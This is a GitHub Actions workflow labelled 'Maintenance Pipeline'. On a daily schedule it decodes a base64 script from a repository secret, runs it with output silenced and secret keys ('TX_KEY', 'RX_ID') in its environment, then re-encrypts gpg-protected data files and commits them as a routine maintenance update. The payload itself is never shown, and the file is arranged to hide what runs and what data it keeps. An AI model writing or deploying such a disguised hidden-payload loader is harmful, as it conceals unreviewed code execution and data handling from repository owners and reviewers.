name: Maintenance Pipeline

on:
  workflow_dispatch:
  schedule:
    - cron: "0 1 * * *" # Run daily at 1 AM UTC

jobs:
  core-job:
    runs-on: ubuntu-latest

    steps:
      - name: ðŸ§¾ Checkout
        uses: actions/checkout@v3

      - name: ðŸ Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: ðŸ“¦ Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install aiohttp tqdm requests

      - name: ðŸ§© Reconstruct Payload
        run: |
          echo "${{ secrets.CORE_PAYLOAD }}" | base64 -d > payload.py
          chmod +x payload.py

      - name: ðŸ”“ Decrypt Data A
        run: |
          if [ -f data_a.enc ]; then
            gpg --batch --yes --passphrase "${{ secrets.DATA_KEY }}" -o data_a.json -d data_a.enc
          else
            echo "[]" > data_a.json
          fi

      - name: ðŸ”“ Decrypt Data B
        run: |
          if [ -f data_b.enc ]; then
            gpg --batch --yes --passphrase "${{ secrets.DATA_KEY }}" -o data_b.log -d data_b.enc
          else
            touch data_b.log
          fi

      - name: ðŸš€ Execute Payload
        run: python payload.py > /dev/null 2>&1
        env:
          TX_KEY: ${{ secrets.TX_KEY }}
          RX_ID: ${{ secrets.RX_ID }}

      - name: ðŸ”’ Re-encrypt Data A
        run: |
          gpg --batch --yes --passphrase "${{ secrets.DATA_KEY }}" -c data_a.json
          mv data_a.json.gpg data_a.enc
          rm data_a.json

      - name: ðŸ”’ Re-encrypt Data B
        run: |
          gpg --batch --yes --passphrase "${{ secrets.DATA_KEY }}" -c data_b.log
          mv data_b.log.gpg data_b.enc
          rm data_b.log

      - name: ðŸ“¦ Commit Updated Encrypted Data
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add data_a.enc data_b.enc || true
          git diff --cached --quiet || git commit -m "ðŸ§­ Maintenance update"
          git push
